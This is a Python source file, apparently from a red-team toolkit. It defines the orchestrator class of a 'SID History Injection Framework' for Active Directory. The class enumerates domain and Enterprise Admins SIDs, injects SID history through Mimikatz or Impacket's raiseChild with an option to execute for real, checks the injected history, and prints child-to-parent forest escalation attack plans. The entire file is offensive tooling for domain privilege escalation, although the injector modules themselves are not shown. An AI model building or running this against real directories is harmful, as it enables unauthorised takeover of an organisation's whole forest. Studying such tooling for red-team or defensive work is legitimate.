"""
SID History Injection Framework
Main orchestrator for SID history injection operations
"""

from pathlib import Path
from typing import Optional, List
import json
from datetime import datetime

from .models import (
    DomainInfo,
    InjectionTarget,
    InjectionOperation,
    InjectionMethod,
    InjectionStatus,
    AttackScenario,
)
from .enumerators import SIDEnumerator
from .injectors import MimikatzInjector, ImpacketInjector, get_available_injectors
from .planners import AttackPlanner
from .utils import get_enterprise_admins_sid, get_high_value_sids


class SIDHistoryFramework:
    """
    Main framework for SID history injection operations
    Coordinates enumeration, injection, and planning
    """

    def __init__(
            self,
            output_dir: str = "sid_history",
            verbose: bool = True
    ):
        """
        Initialize SID history framework

        Args:
            output_dir: Directory for output files
            verbose: Print status messages
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.verbose = verbose

        # Initialize components
        self.enumerator = SIDEnumerator(verbose=verbose)
        self.planner = AttackPlanner(output_dir=output_dir, verbose=verbose)
        self.mimikatz = MimikatzInjector(output_dir=output_dir, verbose=verbose)
        self.impacket = ImpacketInjector(output_dir=output_dir, verbose=verbose)

        # Track state
        self.domains: dict = {}  # domain_name -> DomainInfo
        self.operations: List[InjectionOperation] = []

        self.log("SID History Injection Framework initialized", "success")
        self.log(f"Output directory: {self.output_dir}")

    def log(self, message: str, level: str = "info") -> None:
        """Print status message"""
        if not self.verbose:
            return
        prefixes = {"info": "[*]", "success": "[+]", "error": "[-]", "warning": "[!]"}
        print(f"{prefixes.get(level, '[*]')} {message}")

    def get_domain_sid(
            self,
            domain: str,
            username: str,
            password: str,
            dc: Optional[str] = None
    ) -> Optional[str]:
        """
        Get domain SID

        Args:
            domain: Target domain
            username: Username
            password: Password
            dc: Domain controller

        Returns:
            Domain SID or None
        """
        return self.enumerator.get_domain_sid(domain, username, password, dc)

    def get_enterprise_admins_sid(
            self,
            forest_root_domain: str,
            username: str,
            password: str,
            dc: Optional[str] = None
    ) -> Optional[str]:
        """
        Get Enterprise Admins SID from forest root

        Args:
            forest_root_domain: Forest root domain name
            username: Username
            password: Password
            dc: Domain controller

        Returns:
            Enterprise Admins SID or None
        """
        return self.enumerator.get_enterprise_admins_sid(
            forest_root_domain, username, password, dc
        )

    def register_domain(
            self,
            domain: str,
            username: str,
            password: str,
            dc: Optional[str] = None,
            is_forest_root: bool = False
    ) -> Optional[DomainInfo]:
        """
        Register and enumerate a domain

        Args:
            domain: Domain name
            username: Username
            password: Password
            dc: Domain controller
            is_forest_root: Whether this is forest root

        Returns:
            DomainInfo or None
        """
        self.log(f"Registering domain: {domain}")

        domain_info = self.enumerator.get_domain_info(
            domain, username, password, dc, is_forest_root
        )

        if domain_info:
            self.domains[domain.lower()] = domain_info
            self.log(f"Domain registered: {domain}", "success")
            self.log(f"  SID: {domain_info.sid}")

            if is_forest_root and domain_info.enterprise_admins_sid:
                self.log(f"  Enterprise Admins SID: {domain_info.enterprise_admins_sid}")

        return domain_info

    def inject_sid_history_mimikatz(
            self,
            target_user: str,
            target_domain: str,
            sid_to_inject: str,
            dc_ip: Optional[str] = None
    ) -> InjectionOperation:
        """
        Prepare SID history injection using Mimikatz

        Args:
            target_user: User to inject into
            target_domain: User's domain
            sid_to_inject: SID to add to history
            dc_ip: Domain controller IP

        Returns:
            InjectionOperation
        """
        operation = InjectionOperation(
            target_user=target_user,
            target_domain=target_domain,
            sid_to_inject=sid_to_inject,
            method=InjectionMethod.MIMIKATZ,
            dc_ip=dc_ip
        )

        self.mimikatz.inject(operation)
        self.operations.append(operation)

        return operation

    def inject_sid_history_impacket(
            self,
            target_user: str,
            target_domain: str,
            sid_to_inject: str,
            dc_ip: str,
            username: str,
            password: str,
            execute: bool = False
    ) -> InjectionOperation:
        """
        Inject SID history using Impacket raiseChild

        Args:
            target_user: User to inject into
            target_domain: User's domain (child domain)
            sid_to_inject: SID to add
            dc_ip: Child domain DC IP
            username: DA username
            password: DA password
            execute: Actually execute (vs just generate commands)

        Returns:
            InjectionOperation
        """
        operation = InjectionOperation(
            target_user=target_user,
            target_domain=target_domain,
            sid_to_inject=sid_to_inject,
            method=InjectionMethod.IMPACKET,
            dc_ip=dc_ip
        )

        if execute:
            self.impacket.inject(operation, username, password)
        else:
            commands = self.impacket.generate_commands(operation)
            self.impacket.save_commands(operation, commands)

        self.operations.append(operation)

        return operation

    def verify_sid_history(
            self,
            username: str,
            domain: str,
            auth_username: str,
            auth_password: str,
            dc: Optional[str] = None
    ) -> Optional[InjectionTarget]:
        """
        Verify user's SID history

        Args:
            username: User to check
            domain: User's domain
            auth_username: Authentication username
            auth_password: Authentication password
            dc: Domain controller

        Returns:
            InjectionTarget with SID history
        """
        return self.enumerator.get_user_sid_history(
            username, domain, auth_username, auth_password, dc
        )

    def generate_attack_plan(
            self,
            current_domain: str,
            forest_root_domain: str,
            compromised_user: str
    ) -> None:
        """
        Generate and display attack plan

        Args:
            current_domain: Current (child) domain
            forest_root_domain: Forest root domain
            compromised_user: Compromised DA user
        """
        # Print quick reference
        quick_ref = self.planner.generate_quick_reference(
            current_domain, forest_root_domain, compromised_user
        )
        print(quick_ref)

        # Create scenario if domains are registered
        child = self.domains.get(current_domain.lower())
        parent = self.domains.get(forest_root_domain.lower())

        if child and parent:
            scenario = self.planner.create_child_to_parent_scenario(
                child, parent, compromised_user
            )
            self.planner.print_attack_plan(scenario)
            self.planner.save_attack_plan(scenario)

    def generate_report(self) -> dict:
        """
        Generate comprehensive report

        Returns:
            Report dictionary
        """
        report = {
            "generated_at": datetime.now().isoformat(),
            "tool": "RT SID History Injection Framework",
            "version": "1.0.0",
            "domains": {
                name: info.to_dict()
                for name, info in self.domains.items()
            },
            "operations": [op.to_dict() for op in self.operations],
            "summary": {
                "total_domains": len(self.domains),
                "total_operations": len(self.operations),
                "successful": len([o for o in self.operations if o.status == InjectionStatus.SUCCESS]),
                "failed": len([o for o in self.operations if o.status == InjectionStatus.FAILED]),
                "pending": len([o for o in self.operations if o.status == InjectionStatus.PENDING]),
            }
        }

        # Save report
        report_file = self.output_dir / "sid_history_report.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)

        self.log(f"Report saved to: {report_file}", "success")

        return report

    def list_available_injectors(self) -> dict:
        """
        List available injection methods

        Returns:
            Dictionary of available injectors
        """
        available = get_available_injectors()

        self.log("Available injection methods:")
        for name in available:
            self.log(f"  - {name}", "success")

        if not available:
            self.log("No injection methods available!", "warning")
            self.log("Install Mimikatz or Impacket")

        return available